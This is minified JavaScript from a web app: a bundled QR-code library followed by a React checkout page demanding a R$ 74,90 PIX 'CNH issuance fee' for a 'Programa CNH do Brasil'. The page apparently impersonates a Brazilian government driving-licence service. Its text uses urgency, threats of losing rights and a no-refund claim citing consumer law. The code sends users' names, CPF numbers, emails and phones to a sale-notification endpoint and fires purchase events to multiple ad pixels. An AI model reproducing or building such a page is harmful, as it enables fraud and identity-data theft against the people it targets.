  zc = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", " ", "$", "%", "*", "+", "-", ".", "/", ":"];

function $s(e) {
  this.mode = _3.ALPHANUMERIC, this.data = e
}
$s.getBitsLength = function (t) {
  return 11 * Math.floor(t / 2) + 6 * (t % 2)
};
$s.prototype.getLength = function () {
  return this.data.length
};
$s.prototype.getBitsLength = function () {
  return $s.getBitsLength(this.data.length)
};
$s.prototype.write = function (t) {
  let n;
  for (n = 0; n + 2 <= this.data.length; n += 2) {
    let r = zc.indexOf(this.data[n]) * 45;
    r += zc.indexOf(this.data[n + 1]), t.put(r, 11)
  }
  this.data.length % 2 && t.put(zc.indexOf(this.data[n]), 6)
};
var I3 = $s;
const L3 = vr;

function Hs(e) {
  this.mode = L3.BYTE, typeof e == "string" ? this.data = new TextEncoder().encode(e) : this.data = new Uint8Array(e)
}
Hs.getBitsLength = function (t) {
  return t * 8
};
Hs.prototype.getLength = function () {
  return this.data.length
};
Hs.prototype.getBitsLength = function () {
  return Hs.getBitsLength(this.data.length)
};
Hs.prototype.write = function (e) {
  for (let t = 0, n = this.data.length; t < n; t++) e.put(this.data[t], 8)
};
var O3 = Hs;
const F3 = vr,
  V3 = jt;

function Ws(e) {
  this.mode = F3.KANJI, this.data = e
}
Ws.getBitsLength = function (t) {
  return t * 13
};
Ws.prototype.getLength = function () {
  return this.data.length
};
Ws.prototype.getBitsLength = function () {
  return Ws.getBitsLength(this.data.length)
};
Ws.prototype.write = function (e) {
  let t;
  for (t = 0; t < this.data.length; t++) {
    let n = V3.toSJIS(this.data[t]);
    if (n >= 33088 && n <= 40956) n -= 33088;
    else if (n >= 57408 && n <= 60351) n -= 49472;
    else throw new Error("Invalid SJIS character: " + this.data[t] + `
Make sure your charset is UTF-8`);
    n = (n >>> 8 & 255) * 192 + (n & 255), e.put(n, 13)
  }
};
var B3 = Ws,
  Dx = {
    exports: {}
  };
(function (e) {
  var t = {
    single_source_shortest_paths: function (n, r, s) {
      var o = {},
        i = {};
      i[r] = 0;
      var a = t.PriorityQueue.make();
      a.push(r, 0);
      for (var c, u, d, f, h, y, w, v, S; !a.empty();) {
        c = a.pop(), u = c.value, f = c.cost, h = n[u] || {};
        for (d in h) h.hasOwnProperty(d) && (y = h[d], w = f + y, v = i[d], S = typeof i[d] > "u", (S || v > w) && (i[d] = w, a.push(d, w), o[d] = u))
      }
      if (typeof s < "u" && typeof i[s] > "u") {
        var g = ["Could not find a path from ", r, " to ", s, "."].join("");
        throw new Error(g)
      }
      return o
    },
    extract_shortest_path_from_predecessor_list: function (n, r) {
      for (var s = [], o = r; o;) s.push(o), n[o], o = n[o];
      return s.reverse(), s
    },
    find_path: function (n, r, s) {
      var o = t.single_source_shortest_paths(n, r, s);
      return t.extract_shortest_path_from_predecessor_list(o, s)
    },
    PriorityQueue: {
      make: function (n) {
        var r = t.PriorityQueue,
          s = {},
          o;
        n = n || {};
        for (o in r) r.hasOwnProperty(o) && (s[o] = r[o]);
        return s.queue = [], s.sorter = n.sorter || r.default_sorter, s
      },
      default_sorter: function (n, r) {
        return n.cost - r.cost
      },
      push: function (n, r) {
        var s = {
          value: n,
          cost: r
        };
        this.queue.push(s), this.queue.sort(this.sorter)
      },
      pop: function () {
        return this.queue.shift()
      },
      empty: function () {
        return this.queue.length === 0
      }
    }
  };
  e.exports = t
})(Dx);
var z3 = Dx.exports;
(function (e) {
  const t = vr,
    n = M3,
    r = I3,
    s = O3,
    o = B3,
    i = un,
    a = jt,
    c = z3;

  function u(g) {
    return unescape(encodeURIComponent(g)).length
  }

  function d(g, p, m) {
    const b = [];
    let C;
    for (;
      (C = g.exec(m)) !== null;) b.push({
        data: C[0],
        index: C.index,
        mode: p,
        length: C[0].length
      });
    return b
  }

  function f(g) {
    const p = d(i.NUMERIC, t.NUMERIC, g),
      m = d(i.ALPHANUMERIC, t.ALPHANUMERIC, g);
    let b, C;
    return a.isKanjiModeEnabled() ? (b = d(i.BYTE, t.BYTE, g), C = d(i.KANJI, t.KANJI, g)) : (b = d(i.BYTE_KANJI, t.BYTE, g), C = []), p.concat(m, b, C).sort(function (A, P) {
      return A.index - P.index
    }).map(function (A) {
      return {
        data: A.data,
        mode: A.mode,
        length: A.length
      }
    })
  }

  function h(g, p) {
    switch (p) {
      case t.NUMERIC:
        return n.getBitsLength(g);
      case t.ALPHANUMERIC:
        return r.getBitsLength(g);
      case t.KANJI:
        return o.getBitsLength(g);
      case t.BYTE:
        return s.getBitsLength(g)
    }
  }

  function y(g) {
    return g.reduce(function (p, m) {
      const b = p.length - 1 >= 0 ? p[p.length - 1] : null;
      return b && b.mode === m.mode ? (p[p.length - 1].data += m.data, p) : (p.push(m), p)
    }, [])
  }

  function w(g) {
    const p = [];
    for (let m = 0; m < g.length; m++) {
      const b = g[m];
      switch (b.mode) {
        case t.NUMERIC:
          p.push([b, {
            data: b.data,
            mode: t.ALPHANUMERIC,
            length: b.length
          }, {
              data: b.data,
              mode: t.BYTE,
              length: b.length
            }]);
          break;
        case t.ALPHANUMERIC:
          p.push([b, {
            data: b.data,
            mode: t.BYTE,
            length: b.length
          }]);
          break;
        case t.KANJI:
          p.push([b, {
            data: b.data,
            mode: t.BYTE,
            length: u(b.data)
          }]);
          break;
        case t.BYTE:
          p.push([{
            data: b.data,
            mode: t.BYTE,
            length: u(b.data)
          }])
      }
    }
    return p
  }

  function v(g, p) {
    const m = {},
      b = {
        start: {}
      };
    let C = ["start"];
    for (let j = 0; j < g.length; j++) {
      const A = g[j],
        P = [];
      for (let M = 0; M < A.length; M++) {
        const _ = A[M],
          G = "" + j + M;
        P.push(G), m[G] = {
          node: _,
          lastCount: 0
        }, b[G] = {};
        for (let I = 0; I < C.length; I++) {
          const $ = C[I];
          m[$] && m[$].node.mode === _.mode ? (b[$][G] = h(m[$].lastCount + _.length, _.mode) - h(m[$].lastCount, _.mode), m[$].lastCount += _.length) : (m[$] && (m[$].lastCount = _.length), b[$][G] = h(_.length, _.mode) + 4 + t.getCharCountIndicator(_.mode, p))
        }
      }
      C = P
    }
    for (let j = 0; j < C.length; j++) b[C[j]].end = 0;
    return {
      map: b,
      table: m
    }
  }

  function S(g, p) {
    let m;
    const b = t.getBestModeForData(g);
    if (m = t.from(p, b), m !== t.BYTE && m.bit < b.bit) throw new Error('"' + g + '" cannot be encoded with mode ' + t.toString(m) + `.
 Suggested mode is: ` + t.toString(b));
    switch (m === t.KANJI && !a.isKanjiModeEnabled() && (m = t.BYTE), m) {
      case t.NUMERIC:
        return new n(g);
      case t.ALPHANUMERIC:
        return new r(g);
      case t.KANJI:
        return new o(g);
      case t.BYTE:
        return new s(g)
    }
  }
  e.fromArray = function (p) {
    return p.reduce(function (m, b) {
      return typeof b == "string" ? m.push(S(b, null)) : b.data && m.push(S(b.data, b.mode)), m
    }, [])
  }, e.fromString = function (p, m) {
    const b = f(p, a.isKanjiModeEnabled()),
      C = w(b),
      j = v(C, m),
      A = c.find_path(j.map, "start", "end"),
      P = [];
    for (let M = 1; M < A.length - 1; M++) P.push(j.table[A[M]].node);
    return e.fromArray(y(P))
  }, e.rawSplit = function (p) {
    return e.fromArray(f(p, a.isKanjiModeEnabled()))
  }
})(Rx);
const $l = jt,
  Uc = Bl,
  U3 = S3,
  $3 = C3,
  H3 = Sx,
  W3 = Cx,
  ad = Nx,
  ld = zl,
  K3 = j3,
  il = Px,
  Q3 = Tx,
  G3 = vr,
  $c = Rx;

function q3(e, t) {
  const n = e.size,
    r = W3.getPositions(t);
  for (let s = 0; s < r.length; s++) {
    const o = r[s][0],
      i = r[s][1];
    for (let a = -1; a <= 7; a++)
      if (!(o + a <= -1 || n <= o + a))
        for (let c = -1; c <= 7; c++) i + c <= -1 || n <= i + c || (a >= 0 && a <= 6 && (c === 0 || c === 6) || c >= 0 && c <= 6 && (a === 0 || a === 6) || a >= 2 && a <= 4 && c >= 2 && c <= 4 ? e.set(o + a, i + c, !0, !0) : e.set(o + a, i + c, !1, !0))
  }
}

function Y3(e) {
  const t = e.size;
  for (let n = 8; n < t - 8; n++) {
    const r = n % 2 === 0;
    e.set(n, 6, r, !0), e.set(6, n, r, !0)
  }
}

function X3(e, t) {
  const n = H3.getPositions(t);
  for (let r = 0; r < n.length; r++) {
    const s = n[r][0],
      o = n[r][1];
    for (let i = -2; i <= 2; i++)
      for (let a = -2; a <= 2; a++) i === -2 || i === 2 || a === -2 || a === 2 || i === 0 && a === 0 ? e.set(s + i, o + a, !0, !0) : e.set(s + i, o + a, !1, !0)
  }
}

function J3(e, t) {
  const n = e.size,
    r = il.getEncodedBits(t);
  let s, o, i;
  for (let a = 0; a < 18; a++) s = Math.floor(a / 3), o = a % 3 + n - 8 - 3, i = (r >> a & 1) === 1, e.set(s, o, i, !0), e.set(o, s, i, !0)
}

function Hc(e, t, n) {
  const r = e.size,
    s = Q3.getEncodedBits(t, n);
  let o, i;
  for (o = 0; o < 15; o++) i = (s >> o & 1) === 1, o < 6 ? e.set(o, 8, i, !0) : o < 8 ? e.set(o + 1, 8, i, !0) : e.set(r - 15 + o, 8, i, !0), o < 8 ? e.set(8, r - o - 1, i, !0) : o < 9 ? e.set(8, 15 - o - 1 + 1, i, !0) : e.set(8, 15 - o - 1, i, !0);
  e.set(r - 8, 8, 1, !0)
}

function Z3(e, t) {
  const n = e.size;
  let r = -1,
    s = n - 1,
    o = 7,
    i = 0;
  for (let a = n - 1; a > 0; a -= 2)
    for (a === 6 && a--; ;) {
      for (let c = 0; c < 2; c++)
        if (!e.isReserved(s, a - c)) {
          let u = !1;
          i < t.length && (u = (t[i] >>> o & 1) === 1), e.set(s, a - c, u), o--, o === -1 && (i++, o = 7)
        } if (s += r, s < 0 || n <= s) {
          s -= r, r = -r;
          break
        }
    }
}

function ej(e, t, n) {
  const r = new U3;
  n.forEach(function (c) {
    r.put(c.mode.bit, 4), r.put(c.getLength(), G3.getCharCountIndicator(c.mode, e)), c.write(r)
  });
  const s = $l.getSymbolTotalCodewords(e),
    o = ld.getTotalCodewordsCount(e, t),
    i = (s - o) * 8;
  for (r.getLengthInBits() + 4 <= i && r.put(0, 4); r.getLengthInBits() % 8 !== 0;) r.putBit(0);
  const a = (i - r.getLengthInBits()) / 8;
  for (let c = 0; c < a; c++) r.put(c % 2 ? 17 : 236, 8);
  return tj(r, e, t)
}

function tj(e, t, n) {
  const r = $l.getSymbolTotalCodewords(t),
    s = ld.getTotalCodewordsCount(t, n),
    o = r - s,
    i = ld.getBlocksCount(t, n),
    a = r % i,
    c = i - a,
    u = Math.floor(r / i),
    d = Math.floor(o / i),
    f = d + 1,
    h = u - d,
    y = new K3(h);
  let w = 0;
  const v = new Array(i),
    S = new Array(i);
  let g = 0;
  const p = new Uint8Array(e.buffer);
  for (let A = 0; A < i; A++) {
    const P = A < c ? d : f;
    v[A] = p.slice(w, w + P), S[A] = y.encode(v[A]), w += P, g = Math.max(g, P)
  }
  const m = new Uint8Array(r);
  let b = 0,
    C, j;
  for (C = 0; C < g; C++)
    for (j = 0; j < i; j++) C < v[j].length && (m[b++] = v[j][C]);
  for (C = 0; C < h; C++)
    for (j = 0; j < i; j++) m[b++] = S[j][C];
  return m
}

function nj(e, t, n, r) {
  let s;
  if (Array.isArray(e)) s = $c.fromArray(e);
  else if (typeof e == "string") {
    let u = t;
    if (!u) {
      const d = $c.rawSplit(e);
      u = il.getBestVersionForData(d, n)
    }
    s = $c.fromString(e, u || 40)
  } else throw new Error("Invalid data");
  const o = il.getBestVersionForData(s, n);
  if (!o) throw new Error("The amount of data is too big to be stored in a QR Code");
  if (!t) t = o;
  else if (t < o) throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: ` + o + `.
`);
  const i = ej(t, n, s),
    a = $l.getSymbolSize(t),
    c = new $3(a);
  return q3(c, t), Y3(c), X3(c, t), Hc(c, n, 0), t >= 7 && J3(c, t), Z3(c, i), isNaN(r) && (r = ad.getBestMask(c, Hc.bind(null, c, n))), ad.applyMask(r, c), Hc(c, n, r), {
    modules: c,
    version: t,
    errorCorrectionLevel: n,
    maskPattern: r,
    segments: s
  }
}
wx.create = function (t, n) {
  if (typeof t > "u" || t === "") throw new Error("No input text");
  let r = Uc.M,
    s, o;
  return typeof n < "u" && (r = Uc.from(n.errorCorrectionLevel, Uc.M), s = il.from(n.version), o = ad.from(n.maskPattern), n.toSJISFunc && $l.setToSJISFunction(n.toSJISFunc)), nj(t, s, r, o)
};
var Mx = {},
  Ff = {};
(function (e) {
  function t(n) {
    if (typeof n == "number" && (n = n.toString()), typeof n != "string") throw new Error("Color should be defined as hex string");
    let r = n.slice().replace("#", "").split("");
    if (r.length < 3 || r.length === 5 || r.length > 8) throw new Error("Invalid hex color: " + n);
    (r.length === 3 || r.length === 4) && (r = Array.prototype.concat.apply([], r.map(function (o) {
      return [o, o]
    }))), r.length === 6 && r.push("F", "F");
    const s = parseInt(r.join(""), 16);
    return {
      r: s >> 24 & 255,
      g: s >> 16 & 255,
      b: s >> 8 & 255,
      a: s & 255,
      hex: "#" + r.slice(0, 6).join("")
    }
  }
  e.getOptions = function (r) {
    r || (r = {}), r.color || (r.color = {});
    const s = typeof r.margin > "u" || r.margin === null || r.margin < 0 ? 4 : r.margin,
      o = r.width && r.width >= 21 ? r.width : void 0,
      i = r.scale || 4;
    return {
      width: o,
      scale: o ? 4 : i,
      margin: s,
      color: {
        dark: t(r.color.dark || "#000000ff"),
        light: t(r.color.light || "#ffffffff")
      },
      type: r.type,
      rendererOpts: r.rendererOpts || {}
    }
  }, e.getScale = function (r, s) {
    return s.width && s.width >= r + s.margin * 2 ? s.width / (r + s.margin * 2) : s.scale
  }, e.getImageWidth = function (r, s) {
    const o = e.getScale(r, s);
    return Math.floor((r + s.margin * 2) * o)
  }, e.qrToImageData = function (r, s, o) {
    const i = s.modules.size,
      a = s.modules.data,
      c = e.getScale(i, o),
      u = Math.floor((i + o.margin * 2) * c),
      d = o.margin * c,
      f = [o.color.light, o.color.dark];
    for (let h = 0; h < u; h++)
      for (let y = 0; y < u; y++) {
        let w = (h * u + y) * 4,
          v = o.color.light;
        if (h >= d && y >= d && h < u - d && y < u - d) {
          const S = Math.floor((h - d) / c),
            g = Math.floor((y - d) / c);
          v = f[a[S * i + g] ? 1 : 0]
        }
        r[w++] = v.r, r[w++] = v.g, r[w++] = v.b, r[w] = v.a
      }
  }
})(Ff);
(function (e) {
  const t = Ff;

  function n(s, o, i) {
    s.clearRect(0, 0, o.width, o.height), o.style || (o.style = {}), o.height = i, o.width = i, o.style.height = i + "px", o.style.width = i + "px"
  }

  function r() {
    try {
      return document.createElement("canvas")
    } catch {
      throw new Error("You need to specify a canvas element")
    }
  }
  e.render = function (o, i, a) {
    let c = a,
      u = i;
    typeof c > "u" && (!i || !i.getContext) && (c = i, i = void 0), i || (u = r()), c = t.getOptions(c);
    const d = t.getImageWidth(o.modules.size, c),
      f = u.getContext("2d"),
      h = f.createImageData(d, d);
    return t.qrToImageData(h.data, o, c), n(f, u, d), f.putImageData(h, 0, 0), u
  }, e.renderToDataURL = function (o, i, a) {
    let c = a;
    typeof c > "u" && (!i || !i.getContext) && (c = i, i = void 0), c || (c = {});
    const u = e.render(o, i, c),
      d = c.type || "image/png",
      f = c.rendererOpts || {};
    return u.toDataURL(d, f.quality)
  }
})(Mx);
var _x = {};
const rj = Ff;

function pp(e, t) {
  const n = e.a / 255,
    r = t + '="' + e.hex + '"';
  return n < 1 ? r + " " + t + '-opacity="' + n.toFixed(2).slice(1) + '"' : r
}

function Wc(e, t, n) {
  let r = e + t;
  return typeof n < "u" && (r += " " + n), r
}

function sj(e, t, n) {
  let r = "",
    s = 0,
    o = !1,
    i = 0;
  for (let a = 0; a < e.length; a++) {
    const c = Math.floor(a % t),
      u = Math.floor(a / t);
    !c && !o && (o = !0), e[a] ? (i++, a > 0 && c > 0 && e[a - 1] || (r += o ? Wc("M", c + n, .5 + u + n) : Wc("m", s, 0), s = 0, o = !1), c + 1 < t && e[a + 1] || (r += Wc("h", i), i = 0)) : s++
  }
  return r
}
_x.render = function (t, n, r) {
  const s = rj.getOptions(n),
    o = t.modules.size,
    i = t.modules.data,
    a = o + s.margin * 2,
    c = s.color.light.a ? "<path " + pp(s.color.light, "fill") + ' d="M0 0h' + a + "v" + a + 'H0z"/>' : "",
    u = "<path " + pp(s.color.dark, "stroke") + ' d="' + sj(i, o, s.margin) + '"/>',
    d = 'viewBox="0 0 ' + a + " " + a + '"',
    h = '<svg xmlns="http://www.w3.org/2000/svg" ' + (s.width ? 'width="' + s.width + '" height="' + s.width + '" ' : "") + d + ' shape-rendering="crispEdges">' + c + u + `</svg>
`;
  return typeof r == "function" && r(null, h), h
};
const oj = w3,
  cd = wx,
  Ix = Mx,
  ij = _x;

function Vf(e, t, n, r, s) {
  const o = [].slice.call(arguments, 1),
    i = o.length,
    a = typeof o[i - 1] == "function";
  if (!a && !oj()) throw new Error("Callback required as last argument");
  if (a) {
    if (i < 2) throw new Error("Too few arguments provided");
    i === 2 ? (s = n, n = t, t = r = void 0) : i === 3 && (t.getContext && typeof s > "u" ? (s = r, r = void 0) : (s = r, r = n, n = t, t = void 0))
  } else {
    if (i < 1) throw new Error("Too few arguments provided");
    return i === 1 ? (n = t, t = r = void 0) : i === 2 && !t.getContext && (r = n, n = t, t = void 0), new Promise(function (c, u) {
      try {
        const d = cd.create(n, r);
        c(e(d, t, r))
      } catch (d) {
        u(d)
      }
    })
  }
  try {
    const c = cd.create(n, r);
    s(null, e(c, t, r))
  } catch (c) {
    s(c)
  }
}
Zs.create = cd.create;
Zs.toCanvas = Vf.bind(null, Ix.render);
Zs.toDataURL = Vf.bind(null, Ix.renderToDataURL);
Zs.toString = Vf.bind(null, function (e, t, n) {
  return ij.render(e, n)
});

function gp() {
  const [, e] = In(), [t, n] = x.useState(null), [r, s] = x.useState(!0), [o, i] = x.useState(!1), [a, c] = x.useState(null), [u, d] = x.useState(null), [f, h] = x.useState("pending"), y = x.useRef(!1), w = x.useRef(!1), v = x.useRef(!1);
  x.useEffect(() => {
    if (w.current) return;
    w.current = !0;
    const p = "ttq_purchase_success_tracked";
    if (!1) return;
    const m = localStorage.getItem("userData");
    let b = "",
      C = "";
    if (m) try {
      const A = JSON.parse(m);
      b = A.email || "", C = A.phone || ""
    } catch (A) {
      console.error("Error parsing userData for TikTok Pixel:", A)
    }
    const j = {
      content_type: "product",
      content_id: "cnh_brasil_taxa_emissao",
      content_name: "Taxa Emissao CNH - CNH do Brasil",
      value: 74.9,
      currency: "BRL",
      email: b,
      phone: C
    };
    if (typeof window.ttq < "u") try {
      window.ttq.track("CompletePayment", j), console.log("TikTok Pixel (D5E1SGRC77U40DIQKK20): CompletePayment tracked");
      const A = "D5E1SGRC77U40DIQKK20";
      if (window.ttq.load && window.ttq.load(A), window.ttq.instance) {
        const P = window.ttq.instance(A);
        P && P.track && (P.track("Purchase", j), console.log("TikTok Pixel (D5E1SGRC77U40DIQKK20): Purchase tracked"))
      }
    } catch (A) {
      console.error("TikTok Pixel error:", A)
    }
    if (typeof window.fbq < "u") try {
      window.fbq("track", "Purchase", {
        value: 74.9,
        currency: "BRL",
        content_name: "Taxa Emissao CNH - CNH do Brasil",
        content_type: "product"
      }), console.log("Facebook Pixel (4327697327497010): Purchase tracked"), window.fbq("trackSingle", "1555494242118668", "Purchase", {
        value: 74.9,
        currency: "BRL",
        content_name: "Taxa Emissao CNH - CNH do Brasil",
        content_type: "product"
      }), console.log("Facebook Pixel (4327697327497010): Purchase tracked"), window.fbq("trackSingle", "1154359756859567", "Purchase", {
        value: 74.9,
        currency: "BRL",
        content_name: "Taxa Emissao CNH - CNH do Brasil",
        content_type: "product"
      }), console.log("Facebook Pixel (4327697327497010): Purchase tracked"), window.fbq("trackSingle", "2062889337802425", "Purchase", {
        value: 74.9,
        currency: "BRL",
        content_name: "Taxa Emissao CNH - CNH do Brasil",
        content_type: "product"
      }), console.log("Facebook Pixel (4327697327497010): Purchase tracked")
    } catch (A) {console.error("Facebook Pixel error:", A)} try {const _utmPurchase=()=>{try{window.utmify("track","Purchase",{value:37.2,currency:"BRL"}),console.log("Utmify: Purchase tracked")}catch(e){console.error("Utmify error:",e)}};if(window.utmify){_utmPurchase()}else{let _attempts=0;const _interval=setInterval(()=>{_attempts++;if(window.utmify){clearInterval(_interval);_utmPurchase()}else if(_attempts>=20){clearInterval(_interval);console.warn("Utmify: script not loaded after 10s, Purchase not tracked")}},500)}}catch(A){console.error("Utmify setup error:",A)}

   
    localStorage.setItem(p, new Date().toISOString())
  }, []), x.useEffect(() => {
    if (v.current) return;
    v.current = !0, (async () => {
      try {
        const m = localStorage.getItem("userData"),
          b = localStorage.getItem("detranData");
        let C = {
          nome: "",
          cpf: "",
          email: "",
          phone: ""
        },
          j = "";
        if (m && (C = JSON.parse(m)), b) {
          const A = JSON.parse(b);
          j = A.nome || A.uf || ""
        }
        await fetch("/api/notify-approved", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            nome: C.nome,
            cpf: C.cpf,
            valor: 37.20,
            email: C.email || "",
            telefone: C.phone || "",
            detran: j
          })
        }), console.log("[Success] Notificação de venda APROVADA enviada")
      } catch (m) {
        console.error("[Success] Erro ao enviar notificação APROVADA:", m)
      }
    })()
  }, []), x.useEffect(() => {
    (async () => {
      if (!y.current) {
        y.current = !0, s(!0), c(null);
        try {
          const m = localStorage.getItem("userData");
          if (!m) {
            c("Dados do usuário não encontrados"), s(!1);
            return
          }
          const b = JSON.parse(m),
            j = await (await fetch("/api/pix", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                amount: 74.9,
                customer_name: b.nome,
                customer_email: b.email || "cliente@email.com",
                customer_phone: b.phone || "11999999999",
                customer_cpf: b.cpf
              })
            })).json();
          if (j.success) {
            if (n(j), j.pix_code) try {
              const A = await Zs.toDataURL(j.pix_code, {
                width: 256,
                margin: 2,
                color: {
                  dark: "#000000",
                  light: "#FFFFFF"
                }
              });
              d(A)
            } catch (A) {
              console.error("Erro ao gerar QR code:", A)
            }
          } else c(j.error || "Erro ao gerar PIX")
        } catch (m) {
          console.error("Erro ao criar transação PIX:", m), c("Erro ao conectar com o servidor")
        } finally {
          s(!1)
        }
      }
    })()
  }, []), x.useEffect(() => {
    if (!(t != null && t.transaction_id)) return;
    const p = async () => {
      try {
        const C = await (await fetch(`/api/check-payment?id=${t.transaction_id}`)).json();
        if (C.success && C.status) {
          if (h(C.status), C.status === "paid") return console.log("PAGAMENTO DA TAXA DE EMISSÃO CONFIRMADO!"), setTimeout(() => {
            e("/cadastro-concluido")
          }, 1e3), !0;
          if (C.status === "expired" || C.status === "cancelled") return c("Transação expirada ou cancelada. Por favor, tente novamente."), !0
        }
        return !1
      } catch (b) {
        return console.error("Erro ao verificar status:", b), !1
      }
    }, m = setInterval(async () => {
      await p() && clearInterval(m)
    }, 5e3);
    return () => clearInterval(m)
  }, [t == null ? void 0 : t.transaction_id, e]);
  const S = async () => {
    if (t != null && t.pix_code) try {
      await navigator.clipboard.writeText(t.pix_code), i(!0), setTimeout(() => i(!1), 2e3)
    } catch (p) {
      console.error("Erro ao copiar:", p)
    }
  }, g = () => {
    y.current = !1, s(!0), c(null), window.location.reload()
  };
  return f === "paid" ? l.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: l.jsx(bn, {
        className: "max-w-xl mx-auto",
        children: l.jsx(Sn, {
          className: "pt-6",
          children: l.jsxs("div", {
            className: "text-center",
            children: [l.jsx("div", {
              className: "w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4",
              children: l.jsx(It, {
                className: "w-8 h-8 text-green-600"
              })
            }), l.jsx("h2", {
              className: "text-2xl font-bold text-green-600 mb-2",
              children: "Pagamento Confirmado!"
            }), l.jsx("p", {
              className: "text-gray-600",
              children: "Seu cadastro foi concluído com sucesso!"
            }), l.jsx("p", {
              className: "text-gray-500 text-sm mt-2",
              children: "Redirecionando..."
            })]
          })
        })
      })
    })]
  }) : l.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: l.jsxs(bn, {
        className: "max-w-xl mx-auto shadow-lg border-0",
        children: [l.jsxs(ci, {
          className: "text-center space-y-2 pb-4 border-b",
          children: [l.jsx(ui, {
            className: "text-2xl font-bold text-gray-900",
            children: "Taxa de Emissão da CNH"
          }), l.jsx("p", {
            className: "text-gray-600",
            children: "Esta é a última taxa obrigatória. Após a confirmação do pagamento, você receberá acesso completo ao aplicativo do Programa CNH do Brasil."
          })]
        }), l.jsxs(Sn, {
          className: "pt-6",
          children: [l.jsx("div", {
            className: "flex justify-center mb-6",
            children: l.jsx("img", {
              src: "https://clubedetran.com.br/wp-content/uploads/2018/08/Lancada-a-Carteira-Digital-de-Transito.jpg.webp",
              alt: "Carteira Digital de Trânsito",
              className: "max-w-full h-auto rounded-lg shadow-md",
              style: {
                maxHeight: "200px"
              }
            })
          }), l.jsxs("div", {
            className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
            children: [l.jsx("h4", {
              className: "font-semibold text-blue-900 mb-2 text-center",
              children: "Importante"
            }), l.jsxs("ul", {
              className: "text-sm text-blue-800 space-y-2",
              children: [l.jsxs("li", {
                children: ["• Esta taxa é ", l.jsx("strong", {
                  children: "obrigatória"
                }), " para finalizar seu cadastro no Programa CNH do Brasil"]
              }), l.jsxs("li", {
                children: ["• Valor único de ", l.jsx("strong", {
                  children: "R$ 74,90"
                }), " pago uma única vez"]
              }), l.jsx("li", {
                children: "• Taxa destinada ao processo de emissão e regularização da CNH"
              }), l.jsx("li", {
                children: "• Seu cadastro só será concluído após a confirmação deste pagamento"
              })]
            })]
          }), l.jsxs("div", {
            className: "bg-red-50 p-4 rounded-lg border border-red-200 mb-6",
            children: [l.jsx("h4", {
              className: "font-semibold text-red-800 mb-2 text-center",
              children: "⚠️ Atenção"
            }), l.jsxs("p", {
              className: "text-sm text-red-700",
              children: ["Informamos que, caso o pagamento da ", l.jsx("strong", {
                children: "Taxa de Emissão da CNH"
              }), " não seja realizado, seu cadastro ", l.jsx("strong", {
                children: "não será concluído"
              }), " e você ", l.jsx("strong", {
                children: "perderá o direito de participar do Programa CNH do Brasil"
              }), ". Conforme o art. 49, §2º da Lei nº 8.078/1990 (Código de Defesa do Consumidor), não haverá reembolso do valor já pago referente às taxas administrativas, uma vez que o serviço de processamento já foi iniciado junto ao DETRAN."]
            })]
          }), l.jsxs("div", {
            className: "text-center mb-6",
            children: [l.jsx("p", {
              className: "text-3xl font-bold text-green-600",
              children: "R$ 74,90"
            }), l.jsx("p", {
              className: "text-gray-600",
              children: "Taxa única de emissão"
            })]
          }), r ? l.jsxs("div", {
            className: "text-center py-8",
            children: [l.jsx(vt, {
              className: "h-12 w-12 animate-spin text-[#1351B4] mx-auto mb-4"
            }), l.jsx("p", {
              className: "text-gray-600 font-medium",
              children: "Gerando PIX..."
            }), l.jsx("p", {
              className: "text-gray-500 text-sm mt-1",
              children: "Aguarde um momento"
            })]
          }) : a ? l.jsxs("div", {
            className: "text-center space-y-4",
            children: [l.jsx("div", {
              className: "bg-red-50 p-4 rounded-lg border border-red-100",
              children: l.jsx("p", {
                className: "text-red-800 text-sm",
                children: a
              })
            }), l.jsx(jn, {
              onClick: g,
              className: "bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
              children: "Tentar Novamente"
            })]
          }) : l.jsxs(l.Fragment, {
            children: [l.jsxs("div", {
              className: "bg-yellow-50 p-4 rounded-lg border border-yellow-200 mb-6",
              children: [l.jsxs("div", {
                className: "flex items-center justify-center gap-3",
                children: [l.jsx(vt, {
                  className: "h-5 w-5 animate-spin text-yellow-600"
                }), l.jsx("span", {
                  className: "font-medium text-yellow-800",
                  children: "Aguardando pagamento..."
                })]
              }), l.jsx("p", {
                className: "text-center text-yellow-700 text-sm mt-2",
                children: "O pagamento será confirmado automaticamente"
              })]
            }), l.jsxs("div", {
              className: "text-center mb-6",
              children: [u ? l.jsx("div", {
                className: "bg-white p-4 rounded-lg border-2 border-gray-200 inline-block",
                children: l.jsx("img", {
                  src: u,
                  alt: "QR Code PIX",
                  className: "w-48 h-48"
                })
              }) : l.jsxs("div", {
                className: "bg-white p-8 rounded-lg border-2 border-gray-200 inline-block",
                children: [l.jsx(vt, {
                  className: "h-8 w-8 animate-spin text-[#1351B4] mx-auto"
                }), l.jsx("p", {
                  className: "text-sm text-gray-500 mt-2",
                  children: "Gerando QR Code..."
                })]
              }), l.jsx("p", {
                className: "text-sm text-gray-600 mt-3",
                children: "Escaneie o QR Code com o app do seu banco"
              })]
            }), (t == null ? void 0 : t.pix_code) && l.jsxs("div", {
              className: "mb-6",
              children: [l.jsx("p", {
                className: "text-sm font-medium text-gray-700 mb-2",
                children: "Código PIX Copia e Cola:"
              }), l.jsxs("div", {
                className: "space-y-3",
                children: [l.jsx("div", {
                  className: "p-3 bg-gray-50 rounded-lg border font-mono text-xs break-all max-h-20 overflow-y-auto",
                  children: t.pix_code
                }), l.jsxs(jn, {
                  onClick: S,
                  className: "w-full flex items-center justify-center gap-2 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
                  children: [o ? l.jsx(It, {
                    className: "h-4 w-4"
                  }) : l.jsx(Ol, {
                    className: "h-4 w-4"
